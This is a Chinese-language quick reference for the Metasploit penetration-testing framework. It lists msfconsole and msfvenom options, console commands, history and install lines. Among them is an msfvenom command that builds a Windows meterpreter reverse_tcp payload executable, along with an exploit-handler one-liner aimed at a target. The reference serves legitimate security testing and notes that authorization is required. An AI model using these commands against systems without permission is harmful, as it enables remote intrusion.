# TAGLINE

用于开发、测试和执行漏洞利用代码的渗透测试平台

# TLDR

**启动 Metasploit** 控制台

```msfconsole```

**不显示**横幅启动

```msfconsole -q```

启动时**执行**资源脚本

```msfconsole -r [script.rc]```

**初始化**数据库

```msfdb init```

通过内联命令**运行特定模块**

```msfconsole -x "use [exploit/multi/handler]; set RHOSTS [target]; run"```

用 msfvenom **生成载荷**

```msfvenom -p [windows/meterpreter/reverse_tcp] LHOST=[ip] LPORT=[port] -f [exe] -o [payload.exe]```

**列出可用载荷**

```msfvenom --list payloads```

按关键词**搜索模块**

```msfconsole -q -x "search [type:exploit] [platform:windows]"```

# SYNOPSIS

**msfconsole** [_options_]

# PARAMETERS

**-q**, **--quiet**
> 不打印横幅。

**-r** _file_
> 资源脚本文件。

**-x** _cmd_
> 执行命令。

**-o** _file_
> 输出到文件。

**-L**
> 列出所有可用模块、载荷、编码器或空指令生成器。

**-n** _nopsled_
> 在载荷前附加给定大小的空指令滑道。

**-e** _encoder_
> 要使用的编码器。

**-p** _payload_
> 要使用的载荷（msfvenom）。

**-f** _format_
> 输出格式（msfvenom）：exe、elf、raw、python、c 等。

# DESCRIPTION

**Metasploit Framework** 是一个用于开发、测试和执行漏洞利用代码的渗透测试平台。它包含大量公开漏洞利用代码和载荷，供安全测试使用。

该框架包括 msfconsole（交互式 shell）、msfvenom（载荷生成器）以及各种辅助工具。

# COMMON COMMANDS

```
search <term>     - Search modules
use <module>      - Select module
info              - Module details
show options      - Display module options
set <opt> <val>   - Set option
run / exploit     - Execute module
sessions          - List active sessions
back              - Exit current module
```

# CAVEATS

使用需获得授权。建议配置数据库。需要定期更新。杀毒软件可能标记其生成的载荷。

# HISTORY

Metasploit 由 **H.D. Moore** 于 **2003 年**创建，最初是一个便携式网络工具。它于 **2009 年**被 **Rapid7** 收购，至今仍是最流行的渗透测试框架。

# INSTALL

```pacman: sudo pacman -S metasploit```

```nix: nix profile install nixpkgs#metasploit```

<!-- packages: 2026-07-22 -->

# SEE ALSO

[nmap](/man/nmap)(1), [nikto](/man/nikto)(1), [sqlmap](/man/sqlmap)(1), [hydra](/man/hydra)(1), [wireshark](/man/wireshark)(1)
